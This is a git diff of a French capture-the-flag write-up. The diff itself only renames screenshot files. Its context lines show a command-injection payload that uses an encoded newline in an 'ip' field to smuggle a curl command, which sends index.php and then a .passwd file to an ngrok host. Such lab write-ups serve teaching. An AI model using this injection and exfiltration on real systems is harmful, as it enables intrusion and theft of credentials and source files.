@@ -14,7 +14,7 @@ ip=127.0.0.1+%0A+curl+--data+"@index.php"+https://f3a91ce52ab5.ngrok-free.app/
 
 Maintenant avec ngrok on peut voir toutes les requetes sur `loclahost:4040`
 
-![Body](img/7-file.png"Title")
+![Body](img/8-file.png)
 
 Apres analyse du body à droite en peut refaire la requete avec le bon fichier
 
@@ -22,7 +22,7 @@ Apres analyse du body à droite en peut refaire la requete avec le bon fichier
 ip=127.0.0.1+%0A+curl+--data+"@.passwd"+https://f3a91ce52ab5.ngrok-free.app/
 ```
 
-![Solution](img/7-result.png"Title")
+![Solution](img/8-result.png)
 
 
 On a donc le code
